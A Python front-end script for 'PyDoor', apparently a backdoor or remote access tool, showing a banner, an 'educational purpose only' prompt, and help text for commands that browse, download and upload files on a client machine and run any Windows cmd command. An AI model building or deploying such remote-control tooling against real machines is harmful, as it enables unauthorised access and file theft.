import sys
import time
import server


def gui():
    print('''\033[34m
###################################################################
        ____        ____                  
       / __ \__  __/ __ \____  ____  _____
      / /_/ / / / / / / / __ \/ __ \/ ___/
     / ____/ /_/ / /_/ / /_/ / /_/ / /    
    /_/    \__, /_____/\____/\____/_/     
          /____/                        v2.0.1  (Made by xXNicolaXx)
          
###################################################################     
 \033[97m''')

    cmd = input("\033[31mDo you agree to use this tool for educational purpose only? [y/n]\033[97m")
    if cmd.lower() == 'y':
        print("\n")
        time.sleep(0.3)
        instruction()
    else:
        sys.exit()


def instruction():
    choice = input("Type 'help' for more information about available commands or 'run' to execute the program \n"
                   "PyDoor> ")
    while True: 
        if choice != 'help' and choice != 'run':
            choice = input("PyDoor> ")
        elif choice == 'help':
            helper()
            choice = input("PyDoor> ")
        elif choice == 'run':
            server.main()


def helper():
    print('''\033[95m
To set the server insert the local host ip(or public ip for WAN) and choice an open door. 
WARNING: Client's file has to be setup with the same address configuration

Usage: <command> <option> or <command> <option> <file>

|  command     |     option     |     file       |                      desc                            |

    <cd>      	     <..>              no	                  previous directory
    <cd>          <dir_name>           no	   		   change directory
   <dir>          <dir_name>           no            show files (current directory without option)
 <download>           no         <file_name.ext>     download a file from the client to the server
  <upload>    	      no	 <file_name.ext>           upload a file from the server to the client
   <quit>	      no               no                           quit program

All other Windows cmd commands are supported \n\033[97m''')


if __name__ == "__main__":
    gui()
